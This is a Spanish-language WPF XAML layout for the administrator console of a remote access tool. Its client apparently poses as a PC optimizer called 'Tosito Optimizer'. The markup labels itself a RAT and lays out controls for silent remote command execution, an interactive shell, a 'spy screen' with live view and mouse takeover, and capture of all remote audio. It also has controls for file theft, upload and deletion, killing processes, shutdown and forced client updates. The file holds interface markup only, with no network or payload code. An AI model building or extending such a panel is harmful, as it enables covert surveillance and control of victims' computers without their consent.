<Window x:Class="OptimizadorAdmin.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Optimizador V2 - PANEL DE ADMINISTRADOR" Height="600" Width="900"
        WindowStartupLocation="CenterScreen"
        Background="#11111B" Foreground="#CDD6F4"
        KeyDown="Window_KeyDown" KeyUp="Window_KeyUp">
    <Window.Resources>
        <!-- Colores Globales Dark Theme -->
        <Color x:Key="BgDarkColor">#1E1E2E</Color>
        <Color x:Key="CardBgColor">#313244</Color>
        <Color x:Key="AccentColor">#A6E3A1</Color>
        <Color x:Key="DangerColor">#F38BA8</Color>
        
        <SolidColorBrush x:Key="BgDarkBrush" Color="{StaticResource BgDarkColor}"/>
        <SolidColorBrush x:Key="CardBgBrush" Color="{StaticResource CardBgColor}"/>
        <SolidColorBrush x:Key="AccentBrush" Color="{StaticResource AccentColor}"/>
        <SolidColorBrush x:Key="DangerBrush" Color="{StaticResource DangerColor}"/>

        <Style x:Key="ModernButtonStyle" TargetType="Button">
            <Setter Property="Background" Value="#89B4FA"/>
            <Setter Property="Foreground" Value="#11111B"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Padding" Value="15,8"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border Background="{TemplateBinding Background}" CornerRadius="6" Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Opacity" Value="0.8"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <Style x:Key="ActionButtonStyle" TargetType="Button" BasedOn="{StaticResource ModernButtonStyle}">
            <Setter Property="Background" Value="{StaticResource AccentBrush}"/>
        </Style>

        <Style x:Key="TabButtonStyle" TargetType="RadioButton">
            <Setter Property="Background" Value="#313244"/>
            <Setter Property="Foreground" Value="#CDD6F4"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Padding" Value="15,8"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="RadioButton">
                        <Border x:Name="Border" Background="{TemplateBinding Background}" CornerRadius="6" Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsChecked" Value="True">
                                <Setter TargetName="Border" Property="Background" Value="#89B4FA"/>
                                <Setter Property="Foreground" Value="#11111B"/>
                            </Trigger>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter Property="Opacity" Value="0.8"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>

    <Grid Margin="20">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>

        <StackPanel Grid.Row="0">
            <TextBlock Text="SERVER COMMAND CENTER" FontSize="26" FontWeight="Black" Foreground="{StaticResource AccentBrush}"/>
            <TextBlock Text="Control remoto de mantenimientos y estado en tiempo real." Foreground="#A6ADC8" Margin="0,5,0,20"/>
        </StackPanel>

        <Border Grid.Row="1" Background="{StaticResource CardBgBrush}" CornerRadius="8" Padding="15" Margin="0,0,0,20">
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>
                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                    <TextBlock Text="Estado del Servidor IP/Puerto:" Foreground="#CDD6F4" FontWeight="SemiBold" VerticalAlignment="Center" Margin="0,0,10,0"/>
                    <TextBlock Name="ServerStatusText" Text="Escuchando en 0.0.0.0:8888" Foreground="#A6E3A1" FontWeight="Bold" VerticalAlignment="Center"/>
                </StackPanel>
                <StackPanel Grid.Column="1" Orientation="Horizontal">
                    <TextBlock Name="ConnectedCountText" Text="Múltiples Clientes Conectados: 0" Foreground="#F9E2AF" VerticalAlignment="Center" Margin="0,0,15,0"/>
                </StackPanel>
            </Grid>
        </Border>

        <Grid Grid.Row="2">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="2*"/>
                <ColumnDefinition Width="1*"/>
                <ColumnDefinition Width="1.2*"/>
            </Grid.ColumnDefinitions>

            <!-- Lista de PCs -->
            <Border Grid.Column="0" Background="{StaticResource BgDarkBrush}" CornerRadius="8" Padding="10" Margin="0,0,10,0">
                <DockPanel>
                    <TextBlock DockPanel.Dock="Top" Text="ORDENADORES / CLIENTES CONECTADOS (Doble clic p/ Control Avanzado)" FontSize="14" FontWeight="Bold" Foreground="#89B4FA" Margin="5,0,0,10"/>
                    <ListView x:Name="ClientsListView" Background="Transparent" BorderThickness="0" Foreground="#CDD6F4" MouseDoubleClick="ClientsListView_MouseDoubleClick">
                        <ListView.ContextMenu>
                            <ContextMenu>
                                <MenuItem Header="Administrar Equipo (RAT)" Click="Menu_OpenRat_Click"/>
                                <Separator/>
                                <MenuItem Header="Actualizar Información" Click="RefreshInfo_MenuItem_Click"/>
                            </ContextMenu>
                        </ListView.ContextMenu>
                        <ListView.View>
                            <GridView>
                                <GridViewColumn Header="Equipo Remoto" Width="150" DisplayMemberBinding="{Binding ComputerName}" />
                                <GridViewColumn Header="IP Address" Width="120" DisplayMemberBinding="{Binding IPAddress}" />
                                <GridViewColumn Header="Métricas" Width="200" DisplayMemberBinding="{Binding RAMUsage}" />
                                <GridViewColumn Header="Estado" Width="140" DisplayMemberBinding="{Binding Status}" />
                            </GridView>
                        </ListView.View>
                    </ListView>
                </DockPanel>
            </Border>

            <!-- Panel de Comandos Remotos Básicos -->
            <Border Grid.Column="1" Background="{StaticResource CardBgBrush}" CornerRadius="8" Padding="15" Margin="0,0,10,0">
                <ScrollViewer VerticalScrollBarVisibility="Auto">
                    <StackPanel>
                        <TextBlock Text="MANTENIMIENTO" FontSize="14" FontWeight="Bold" Foreground="#A6E3A1" Margin="0,0,0,15"/>
                        <TextBlock Text="Se ejecutará en el PC." Foreground="#A6ADC8" FontSize="11" Margin="0,0,0,15" TextWrapping="Wrap"/>
                        
                        <Button Content="🧹 Limpieza Express" Style="{StaticResource ModernButtonStyle}" Margin="0,0,0,10" Click="Cmd_QuickClean_Click"/>
                        <Button Content="🚀 Liberar RAM (Kill)" Style="{StaticResource ActionButtonStyle}" Margin="0,0,0,10" Click="Cmd_FreeRAM_Click"/>
                        <Button Content="⚡ Modo Gaming" Style="{StaticResource ActionButtonStyle}" Margin="0,0,0,10" Click="Cmd_GameMode_Click"/>
                        
                        <Separator Background="#45475A" Margin="0,15"/>
                        <TextBlock Text="ACTUALIZACIONES" FontSize="12" FontWeight="Bold" Foreground="#F9E2AF" Margin="0,0,0,10"/>
                        <Button Content="🛠️ Reparación Núcleo" Style="{StaticResource ModernButtonStyle}" Background="#89B4FA" Foreground="#11111B" Margin="0,0,0,10" Click="Cmd_SystemRepair_Click"/>
                        <Button Content="🔄 Acutalizar Apps" Style="{StaticResource ModernButtonStyle}" Background="#F9E2AF" Foreground="#11111B" Margin="0,0,0,10" Click="Cmd_UpdateApps_Click"/>
                        
                        <TextBlock Name="CommandFeedbackText" Text="..." Foreground="#A6ADC8" TextWrapping="Wrap" Margin="0,15,0,0"/>
                    </StackPanel>
                </ScrollViewer>
            </Border>

            <!-- Panel de Comandos Extremos -->
            <Border Grid.Column="2" Background="{StaticResource CardBgBrush}" CornerRadius="8" Padding="15">
                <ScrollViewer VerticalScrollBarVisibility="Auto">
                    <StackPanel>
                        <TextBlock Text="CONTROL TOTAL (PELIGRO)" FontSize="14" FontWeight="Bold" Foreground="#F38BA8" Margin="0,0,0,15"/>
                        
                        <StackPanel Orientation="Horizontal" Margin="0,0,0,15">
                            <Button Content="🔌 Apagar PC" Style="{StaticResource ModernButtonStyle}" Background="#F38BA8" Foreground="#11111B" Margin="0,0,10,0" Width="100" Click="Cmd_PowerOff_Click"/>
                            <Button Content="🔄 Reiniciar PC" Style="{StaticResource ModernButtonStyle}" Background="#F9E2AF" Foreground="#11111B" Width="100" Click="Cmd_Restart_Click"/>
                        </StackPanel>

                        <Separator Background="#45475A" Margin="0,5,0,15"/>
                        
                        <TextBlock Text="Matar Proceso Remoto" Foreground="#CDD6F4" FontSize="12" Margin="0,0,0,5"/>
                        <TextBox Name="KillProcessBox" Background="#1E1E2E" Foreground="#CDD6F4" Padding="8" BorderThickness="0" Margin="0,0,0,5" ToolTip="Nombre proceso sin .exe (Ej: chrome)"/>
                        <Button Content="☠️ Forzar Cierre" Style="{StaticResource ModernButtonStyle}" Background="#F38BA8" Foreground="#11111B" Margin="0,0,0,15" Click="Cmd_KillProcess_Click"/>
                        
                        <Separator Background="#45475A" Margin="0,5,0,15"/>
                        
                        <TextBlock Text="Terminal Remota (Silenciosa)" Foreground="#CDD6F4" FontSize="12" Margin="0,0,0,5"/>
                        <TextBox Name="TerminalBox" Background="#1E1E2E" Foreground="#CDD6F4" Padding="8" BorderThickness="0" Margin="0,0,0,5" ToolTip="Ej: mkdir C:\Temp\test"/>
                        <Button Content=">_ Ejecutar Script" Style="{StaticResource ModernButtonStyle}" Background="#A6E3A1" Foreground="#11111B" Margin="0,0,0,10" Click="Cmd_RunScript_Click"/>
                        
                        <TextBlock Text="Enviar Mensaje a Pantalla" Foreground="#CDD6F4" FontSize="12" Margin="0,0,0,5"/>
                        <TextBox Name="MessageBoxInput" Background="#1E1E2E" Foreground="#CDD6F4" Padding="8" BorderThickness="0" Margin="0,0,0,5" ToolTip="Texto del popup..."/>
                        <Button Content="💬 Lanzar Pop-up" Style="{StaticResource ModernButtonStyle}" Background="#F9E2AF" Foreground="#11111B" Margin="0,0,0,10" Click="Cmd_ShowMsg_Click"/>
                        
                    </StackPanel>
                </ScrollViewer>
            </Border>
        </Grid>

        <!-- PANEL OVERLAY: CONTROL DETALLADO (RAT) -->
        <Grid x:Name="RatOverlayGrid" Grid.Row="0" Grid.RowSpan="3" Background="#EE11111B" Visibility="Collapsed" Panel.ZIndex="100">
            <Border Background="{StaticResource BgDarkBrush}" CornerRadius="12" Margin="30" Padding="20">
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="*"/>
                    </Grid.RowDefinitions>

                    <DockPanel Grid.Row="0" LastChildFill="False" Margin="0,0,0,15">
                        <TextBlock x:Name="RatTitleText" Text="Administración RAT - Cliente Selecto" FontSize="20" FontWeight="Bold" Foreground="{StaticResource AccentBrush}" DockPanel.Dock="Left" VerticalAlignment="Center"/>
                        <Button Content="CERRAR PANEL [X]" DockPanel.Dock="Right" Style="{StaticResource ModernButtonStyle}" Background="{StaticResource DangerBrush}" Padding="15,5" Click="CloseRatPanel_Click"/>
                    </DockPanel>

                    <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,0,0,15">
                        <RadioButton x:Name="BtnTabProcesos" Content="Task Manager" Style="{StaticResource TabButtonStyle}" Margin="0,0,10,0" IsChecked="True" Checked="RatTab_Checked"/>
                        <RadioButton x:Name="BtnTabConsola" Content="Shell Interactiva" Style="{StaticResource TabButtonStyle}" Margin="0,0,10,0" Checked="RatTab_Checked"/>
                        <RadioButton x:Name="BtnTabPantalla" Content="Pantalla Espía" Style="{StaticResource TabButtonStyle}" Margin="0,0,10,0" Checked="RatTab_Checked"/>
                        <RadioButton x:Name="BtnTabAudio" Content="Audio Remoto" Style="{StaticResource TabButtonStyle}" Margin="0,0,10,0" Checked="RatTab_Checked"/>
                        <RadioButton x:Name="BtnTabExplorador" Content="Archivos" Style="{StaticResource TabButtonStyle}" Margin="0,0,10,0" Checked="RatTab_Checked"/>
                        <RadioButton x:Name="BtnTabSistema" Content="Sistema/Update" Style="{StaticResource TabButtonStyle}" Checked="RatTab_Checked"/>
                    </StackPanel>

                    <!-- VISTAS RAT -->
                    <Grid Grid.Row="2">
                        <!-- Vista 1: Procesos -->
                        <Grid x:Name="View_RatProcesses" Visibility="Visible">
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <StackPanel Orientation="Horizontal" Margin="0,0,0,10">
                                <Button Content="🔄 Refrescar Procesos" Style="{StaticResource ActionButtonStyle}" Click="Rat_RefreshProcesses_Click" Margin="0,0,10,0"/>
                                <Button Content="☠️ Matar Proceso Seleccionado" Style="{StaticResource ModernButtonStyle}" Background="{StaticResource DangerBrush}" Click="Rat_KillSelectedProcess_Click"/>
                            </StackPanel>
                            <ListView x:Name="RatProcessesList" Grid.Row="1" Background="{StaticResource CardBgBrush}" BorderThickness="0" Foreground="#CDD6F4">
                                <ListView.View>
                                    <GridView>
                                        <GridViewColumn Header="PID" Width="80" DisplayMemberBinding="{Binding Id}" />
                                        <GridViewColumn Header="Nombre" Width="150" DisplayMemberBinding="{Binding Name}" />
                                        <GridViewColumn Header="RAM (MB)" Width="100" DisplayMemberBinding="{Binding Memory}" />
                                        <GridViewColumn Header="Título Ventana" Width="300" DisplayMemberBinding="{Binding Title}" />
                                    </GridView>
                                </ListView.View>
                            </ListView>
                        </Grid>

                        <!-- Vista: Sistema -->
                        <Grid x:Name="View_RatSystem" Visibility="Collapsed">
                            <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center">
                                <TextBlock Text="⚙️ GESTIÓN DE SISTEMA" FontSize="18" FontWeight="Bold" Foreground="#A6E3A1" HorizontalAlignment="Center" Margin="0,0,0,20"/>
                                <Border Background="#1E1E2E" CornerRadius="12" Padding="30" Width="400">
                                    <StackPanel>
                                        <TextBlock Text="ACTUALIZACIÓN REMOTA" FontSize="14" FontWeight="Bold" Foreground="#CDD6F4" Margin="0,0,0,10"/>
                                        <TextBlock Text="Actualiza este PC a la última versión de Tosito Optimizer automáticamente." Foreground="#A6ADC8" TextWrapping="Wrap" Margin="0,0,0,20"/>
                                        <Button Content="🚀 ACTUALIZAR CLIENTE AHORA" Style="{StaticResource ModernButtonStyle}" Background="#A6E3A1" Foreground="#11111B" Click="Rat_UpdateClient_Click"/>
                                        <TextBlock x:Name="UpdateStatusText" Text="" Foreground="#F9E2AF" Margin="0,15,0,0" HorizontalAlignment="Center"/>
                                    </StackPanel>
                                </Border>
                            </StackPanel>
                        </Grid>

                        <!-- Vista de Audio -->
                        <Grid x:Name="View_RatAudio" Visibility="Collapsed">
                            <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center">
                                <TextBlock Text="🎧 CONTROL DE AUDIO REMOTO" FontSize="18" FontWeight="Bold" Foreground="#89B4FA" HorizontalAlignment="Center" Margin="0,0,0,20"/>
                                <Border Background="#1E1E2E" CornerRadius="12" Padding="30">
                                    <StackPanel>
                                        <TextBlock Text="Estado del Stream:" Foreground="#A6ADC8" Margin="0,0,0,10"/>
                                        <TextBlock x:Name="AudioStatusText" Text="SIN CONEXIÓN" FontWeight="Black" FontSize="20" Foreground="#F38BA8" HorizontalAlignment="Center" Margin="0,0,0,30"/>
                                        
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="*"/>
                                            </Grid.ColumnDefinitions>
                                            <Button Grid.Column="0" Content="🔊 ACTIVAR ESCUCHA" Style="{StaticResource ActionButtonStyle}" Margin="0,0,10,0" Click="BtnStartAudio_Click"/>
                                            <Button Grid.Column="1" Content="🔇 DETENER" Style="{StaticResource ModernButtonStyle}" Background="{StaticResource DangerBrush}" Click="BtnStopAudio_Click"/>
                                        </Grid>
                                        
                                        <TextBlock Text="* Se capturará todo el sonido del PC remoto." Foreground="#585B70" FontSize="11" Margin="0,20,0,0" TextAlignment="Center"/>
                                    </StackPanel>
                                </Border>
                            </StackPanel>
                        </Grid>

                        <!-- Vista 2: Consola -->
                        <Grid x:Name="View_RatConsole" Visibility="Collapsed">
                            <Grid.RowDefinitions>
                                <RowDefinition Height="*"/>
                                <RowDefinition Height="Auto"/>
                            </Grid.RowDefinitions>
                            <TextBox x:Name="RatConsoleOutput" Grid.Row="0" Background="#0C0C0C" Foreground="#00FF00" FontFamily="Consolas" IsReadOnly="True" VerticalScrollBarVisibility="Auto" AcceptsReturn="True" TextWrapping="Wrap" Margin="0,0,0,10"/>
                            <DockPanel Grid.Row="1">
                                <TextBlock Text="C:\> " Foreground="#00FF00" FontSize="16" FontFamily="Consolas" VerticalAlignment="Center" DockPanel.Dock="Left"/>
                                <TextBox x:Name="RatConsoleInput" Background="#1E1E2E" Foreground="#CDD6F4" Padding="10" BorderThickness="0" FontFamily="Consolas" KeyDown="RatConsoleInput_KeyDown"/>
                            </DockPanel>
                        </Grid>

                        <!-- Vista 3: Pantalla -->
                        <Grid x:Name="View_RatScreen" Visibility="Collapsed">
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <StackPanel Orientation="Horizontal" Margin="0,0,0,10">
                                <Button Content="📷 Captura Única" Style="{StaticResource ModernButtonStyle}" Margin="0,0,10,0" Click="Rat_GetScreen_Click"/>
                                <CheckBox x:Name="CheckLiveScreen" Content="🎥 Pantalla en VIVO" Foreground="#CDD6F4" VerticalAlignment="Center" FontSize="14" Checked="CheckLiveScreen_Checked" Unchecked="CheckLiveScreen_Unchecked" Margin="0,0,10,0"/>
                                <CheckBox x:Name="CheckRemoteControl" Content="🎮 Control Remoto" Foreground="#CDD6F4" VerticalAlignment="Center" FontSize="14" Checked="CheckRemoteControl_Checked" Margin="0,0,10,0"/>
                                <Button Content="📺 Pantalla Completa" Style="{StaticResource ModernButtonStyle}" Background="#A6E3A1" Foreground="#11111B" Margin="0,0,10,0" Click="BtnFullscreen_Click"/>
                                <TextBlock x:Name="LiveStatusText" Text="• Inactivo" Foreground="#F38BA8" VerticalAlignment="Center" Margin="5,0,0,0" FontWeight="Bold"/>
                            </StackPanel>
                            <Border Grid.Row="1" Background="Black" CornerRadius="4" ClipToBounds="True">
                                <Image x:Name="RatScreenImg" Stretch="Uniform" 
                                       MouseMove="RatScreenImg_MouseMove" 
                                       MouseDown="RatScreenImg_MouseDown"
                                       MouseUp="RatScreenImg_MouseUp"
                                       MouseWheel="RatScreenImg_MouseWheel"
                                       MouseRightButtonDown="RatScreenImg_MouseRightButtonDown"/>
                            </Border>
                        </Grid>

                        <!-- Vista 4: Explorador de Archivos -->
                        <Grid x:Name="View_RatFiles" Visibility="Collapsed">
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                                <RowDefinition Height="Auto"/>
                            </Grid.RowDefinitions>
                            
                            <StackPanel Grid.Row="0">
                                <DockPanel Margin="0,0,0,10">
                                    <Button Content="🏠" Style="{StaticResource ActionButtonStyle}" Width="40" Margin="0,0,5,0" Click="Rat_ExplorerHome_Click"/>
                                    <Button Content="⬆️" Style="{StaticResource ActionButtonStyle}" Width="40" Margin="0,0,5,0" Click="Rat_ExplorerUp_Click"/>
                                    <TextBox x:Name="RatExplorerPath" Background="#1E1E2E" Foreground="#CDD6F4" Padding="10" BorderThickness="0" VerticalAlignment="Center" KeyDown="RatExplorerPath_KeyDown"/>
                                </DockPanel>
                            </StackPanel>

                            <ListView x:Name="RatFilesList" Grid.Row="1" Background="{StaticResource CardBgBrush}" BorderThickness="0" Foreground="#CDD6F4" MouseDoubleClick="RatFilesList_MouseDoubleClick">
                                <ListView.View>
                                    <GridView>
                                        <GridViewColumn Header="Ícono" Width="40">
                                            <GridViewColumn.CellTemplate>
                                                <DataTemplate>
                                                    <TextBlock Text="{Binding Icon}" HorizontalAlignment="Center"/>
                                                </DataTemplate>
                                            </GridViewColumn.CellTemplate>
                                        </GridViewColumn>
                                        <GridViewColumn Header="Nombre" Width="300" DisplayMemberBinding="{Binding Name}" />
                                        <GridViewColumn Header="Tamaño" Width="100" DisplayMemberBinding="{Binding SizeStr}" />
                                        <GridViewColumn Header="Fecha Modificación" Width="150" DisplayMemberBinding="{Binding Date}" />
                                    </GridView>
                                </ListView.View>
                            </ListView>

                            <StackPanel Grid.Row="2" Orientation="Horizontal" Margin="0,15,0,0">
                                <Button Content="📥 Descargar" Style="{StaticResource ActionButtonStyle}" Margin="0,0,10,0" Click="Rat_DownloadFile_Click"/>
                                <Button Content="📤 Subir" Style="{StaticResource ActionButtonStyle}" Margin="0,0,10,0" Click="Rat_UploadFile_Click"/>
                                <Button Content="🗑️ Borrar" Style="{StaticResource ModernButtonStyle}" Background="{StaticResource DangerBrush}" Click="Rat_DeleteFile_Click"/>
                                <TextBlock x:Name="RatExplorerStatus" Text="Listo" Foreground="#A6ADC8" VerticalAlignment="Center" Margin="20,0,0,0"/>
                            </StackPanel>
                        </Grid>
                    </Grid>
                </Grid>
            </Border>
        </Grid>
        
        <!-- MODO PANTALLA COMPLETA RAT -->
        <Grid x:Name="FullscreenRatGrid" Visibility="Collapsed" Background="Black" Panel.ZIndex="1000">
            <Image x:Name="RatFullscreenImg" Stretch="Uniform"
                   MouseMove="RatScreenImg_MouseMove" 
                   MouseDown="RatScreenImg_MouseDown"
                   MouseUp="RatScreenImg_MouseUp"
                   MouseWheel="RatScreenImg_MouseWheel"/>
            <Button Content=" ESC - SALIR " Style="{StaticResource ModernButtonStyle}" 
                    Background="#5511111B" Foreground="White" Opacity="0.5"
                    HorizontalAlignment="Right" VerticalAlignment="Top" Margin="20"
                    Click="ExitFullscreen_Click"/>
        </Grid>
    </Grid>
</Window>
